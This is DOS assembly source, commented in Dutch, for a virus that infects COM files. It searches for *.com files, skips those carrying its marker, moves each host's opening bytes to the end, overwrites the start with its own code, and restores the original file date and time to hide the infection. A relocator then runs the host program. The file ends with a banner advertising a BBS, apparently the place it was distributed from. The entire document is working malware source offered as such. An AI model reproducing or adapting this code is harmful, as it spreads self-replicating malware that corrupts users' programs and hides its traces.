Code   Segment
       Assume  CS:Code,DS:Code,ES:Code

       V_Length        Equ Program - Main
       F_Name	       Equ 0FC1Eh
       F_Time	       Equ 0FC16h
       F_Date	       Equ 0FC18h
       HAdr	       Equ 0FD00h
       DTA	       Equ 0FC00h

       Org     100h

Main:
       push [BOP]			;bewaar orginele offset programma

       mov ah,1ah			;DTA boven neerzetten
       mov dx,DTA			;DTA adres
       int 21h

       mov ah,4eh			;zoek naar COM files
       mov dx,Offset Target
       xor cx,cx
       int 21h

Read_file:
       mov ax,3d02h			;open het doelbestand
       mov dx,Offset F_Name
       int 21h

       mov bx,ax                        ;bewaar de file handle

       mov bp,cs:[F_Time]		;Bewaar de tijd
       mov di,cs:[F_Date]		;Bewaar de datum

       mov ah,3fh			;lees deel van het doelbestand
       mov dx,Hadr			;buffer adres
       mov cx,V_Length			;lengte van het 4us
       int 21h				;naar het hoog adres in

       mov si,dx			;Is het bestand al geinfecteerd?
       cmp Word Ptr [si],36ffh
       jne Infect_File			;Nee, infecteer het

       mov ah,4fh			;Zoek volgende COM bestand
       int 21h

       jc End_Infect
       jmp Short Read_File

Infect_File:
       mov ax,4202h			;zoek naar het einde van doelbestand
       xor cx,cx                        ;ax bevat na het na het uitvoeren van
       xor dx,dx                        ;de interrupt de lengte van de file
       int 21h

       add ax,100h			;tel 100h bytes PSP erbij op en
       mov BOP,ax			;bewaar de lengte van het doelbestand

       mov ah,40h			;overschrijf begin van doelbestand
       mov cx,V_Length			;lengte van het 4us
       mov dx,HAdr			;buffer
       int 21h

       mov ax,4200h			;zoek het begin van het doelbestand op
       xor cx,cx
       xor dx,dx
       int 21h

       mov ah,40h			;schrijf de 4uscode over de file
       mov cx,V_Length			;lengte van het 4us
       mov dx,Offset Main
       int 21h

       mov ax,5701h			;zet orginele datum terug
       mov dx,di			;datum
       mov cx,bp			;tijd
       int 21h

End_Infect:
       mov ah,3eh			;sluit het doelbestand af
       int 21h

       mov ah,1ah			;set DTA terug naar default
       mov dx,0080h
       int 21h

       cld				;voorwaarts
       mov di,HAdr			;buffer
       push di				;en nog een voor het verplaatsen straks
       mov si,Offset MoveBlock		;wijst naar relocator
       mov cx,Program - MoveBlock	;lengte relocator
       rep movsb			;verplaats het block
       ret				;en ga er naar toe

BOP    dw  Offset Program

MoveBlock:
        mov cx,V_Length                 ;aantal bytes dat verplaatst wordt
        pop si                          ;haal BOP terug via de stack
        mov di,0100h                    ;hier gaat het allemaal naar toe
	push di 			;bewaar voor de RET
	rep movsb			;verplaatsen
	ret				;en start orginele programma op

Target:
        db '*.com',0

Program:                                ;Dit is het fake programma wat later
       mov ah,4ch                       ;door de relocator verplaatst wordt
       int 21h                          ;naar het begin van de file

Code    Ends
End     Main

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
